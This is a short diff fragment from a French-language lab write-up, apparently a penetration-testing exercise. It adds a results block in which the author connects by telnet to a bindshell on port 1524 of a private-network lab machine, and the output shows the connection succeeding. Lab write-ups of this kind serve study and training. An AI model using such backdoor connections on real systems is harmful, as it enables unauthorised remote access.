@@ -66,5 +66,11 @@ On va donc essayer de se connecter directement avec le protocol Telnet sur la ma
 * le port sur lequel on veut se connecter , ici celui de bindshell le 1524
 
 Résultats:
+>
+> {*] exec:  telnet 192.168.56.xx 1524
+>
+>trying 192.168.56.xx
+>
+>connected to 192.168.56.xx
 
 
